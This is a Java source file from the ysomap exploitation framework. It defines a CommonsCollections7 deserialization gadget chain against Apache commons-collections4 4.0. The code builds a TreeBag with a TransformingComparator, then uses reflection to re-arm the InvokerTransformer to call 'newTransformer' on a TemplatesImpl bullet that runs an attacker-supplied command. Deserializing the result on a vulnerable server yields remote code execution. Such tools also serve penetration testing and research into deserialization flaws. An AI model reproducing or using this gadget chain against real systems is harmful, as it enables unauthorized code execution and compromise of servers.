package ysomap.core.gadget.payload.collections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Payloads;
import ysomap.annotation.Require;
import ysomap.core.ObjectGadget;
import ysomap.core.gadget.bullet.jdk.TemplatesImplBullet;
import ysomap.core.bean.Payload;
import ysomap.util.ReflectionHelper;

/**
 * from ysoserial CommonsCollection8
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Payloads
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Require(bullets = {"TemplatesImplBullet"})
@Authors({ Authors.NAVALORENZO })
public class CommonsCollections7 extends Payload<TreeBag> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof TemplatesImpl;
    }

    @Override
    public TreeBag pack(Object obj) throws Exception {
        // setup harmless chain
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(obj);

        // arm transformer
        ReflectionHelper.setFieldValue(transformer, "iMethodName", "newTransformer");

        return tree;
    }

    @Override
    public ObjectGadget getDefaultBullet(String command) throws Exception {
        return new TemplatesImplBullet().set("body", command);
    }
}
